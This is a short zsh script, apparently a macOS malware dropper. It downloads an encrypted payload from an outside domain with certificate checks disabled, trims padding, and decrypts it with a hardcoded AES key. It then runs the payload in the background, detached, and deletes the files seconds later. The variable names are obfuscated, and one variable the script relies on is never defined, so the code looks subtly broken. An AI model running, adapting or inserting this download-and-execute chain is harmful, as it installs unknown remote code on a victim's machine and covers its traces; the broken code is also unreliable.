#!/bin/zsh
jezq2=$(mktemp /tmp/3nf6tx.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m124cd4e7c36c8620.bin" -o "$jezq2z" || exit 1
j3cexd=$(stat -f %z "$jezq2z"); fn92wwq=$(( j3cexd - 1301 - 1421 ))
tail -c +$(( 1301 + 1 )) "$jezq2z" | head -c $fn92wwq | openssl enc -d -aes-256-cbc -k 1b2af12bfed9fc9105c67f4a -out "$jezq2" 2>/dev/null
[ -s "$jezq2" ] && chmod 700 "$jezq2" && ( "$jezq2" & ) && disown
( sleep 3; rm -f "$jezq2" "$jezq2z" ) &>/dev/null &
